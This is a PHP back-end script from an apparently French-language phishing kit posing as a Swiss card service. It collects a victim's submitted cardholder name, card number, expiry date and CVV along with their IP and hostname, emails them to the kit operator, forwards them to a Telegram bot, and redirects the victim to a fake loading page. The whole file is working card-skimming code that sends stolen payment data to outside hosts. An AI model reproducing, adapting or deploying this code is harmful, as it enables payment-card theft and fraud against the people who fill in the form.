<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-------- SWISS CARD ---------\n";
$message .= "HLD      : ".$_POST['mol']."\n";
$message .= "CRD      : ".$_POST['cc']."\n";
$message .= "EXP      : ".$_POST['exdate']."\n";
$message .= "CSC      : ".$_POST['cvv']."\n";
$message .= "ALO      : ".$_POST['alo']."\n";
$message .= "----------- Z3CI ------------\n";
$message .= "lP      : $ip\n";
$message .= "H0ST    : $hostname\n";
$send = "";
$subject = "Carte| ".$_POST['cardnumber']." | $ip ";
$headers = "From:Z3CI <ana@vps767524.ovh.net>";
mail($MyEmail,$subject,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: load.html?id=4932YR-329TR23R");

?>